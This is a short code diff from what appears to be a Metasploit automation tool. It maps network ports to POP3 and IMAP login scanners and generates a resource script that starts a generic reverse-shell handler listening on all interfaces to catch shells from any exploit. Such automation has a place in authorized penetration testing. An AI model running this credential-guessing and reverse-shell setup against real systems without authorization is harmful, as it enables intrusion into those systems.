@@ -825,14 +825,14 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     110: [
         {"m": "auxiliary/scanner/pop3/pop3_version"},
         {"m": "auxiliary/scanner/pop3/pop3_login",
-         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
+         "cred": True},
     ],
 
     # ── IMAP (143) ────────────────────────────────────────────────────────────
     143: [
         {"m": "auxiliary/scanner/imap/imap_version"},
         {"m": "auxiliary/scanner/imap/imap_login",
-         "x": {"BLANK_PASSWORDS": "true"}, "cred": True},
+         "cred": True},
     ],
 
     # ── SNMP (161) ────────────────────────────────────────────────────────────
@@ -1438,6 +1438,7 @@ def build_msf_rc(
         "",
         f"setg LHOST {lhost}",
         f"setg LPORT {lport}",
+        f"setg SRVHOST {lhost}",         # for jenkins_login and modules needing callback
         "",
         # Start a generic multi/handler first so reverse shells from any exploit
         # land immediately without needing a separate listener process.
@@ -1448,6 +1449,7 @@ def build_msf_rc(
         "set PAYLOAD generic/shell_reverse_tcp",
         f"set LHOST {lhost}",
         f"set LPORT {lport}",
+        "set ReverseListenerBindAddress 0.0.0.0",  # bind to all interfaces
         "set ExitOnSession false",       # keep handler alive for multiple sessions
         # NOTE: AutoRunScript is NOT set here — generic/shell_reverse_tcp does not
         # support it (MSF warns "Unknown datastore option"). Post-exploit commands
